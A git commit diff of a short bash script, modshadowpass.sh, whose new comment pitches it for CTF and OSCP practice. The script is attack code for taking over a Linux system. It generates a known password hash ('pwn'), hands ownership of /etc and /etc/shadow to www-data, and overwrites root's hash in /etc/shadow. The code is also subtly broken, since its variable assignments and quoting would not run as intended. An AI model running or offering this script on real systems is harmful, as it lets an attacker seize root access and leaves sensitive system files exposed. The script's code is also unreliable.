e97ac26171d50383706405ad9d476fc87e7c3f1b
ferreirasc <leoferreirafx@gmail.com>
2021-08-13 20:49:43 -0400

    modshadow

--- modshadowpass.sh
+++ modshadowpass.sh
@@ -1,10 +1,10 @@
 #!/bin/bash
 
-# Script for change a password modifying the shadow file. Obviously, we need root privileges to do this.
+# In case we have write privileges to /etc/shadow... useful for CTFs/OSCP
 # default pass in the script: "pwn"
 
 $user="www-data"
 $pass=`openssl passwd -1 -salt xyz pwn`
 chown $user.$user /etc; chown $user.$user /etc/shadow
 sed -i -e 's/^root:[^:]\+:/root:$pass:/' /etc/shadow
- 
+
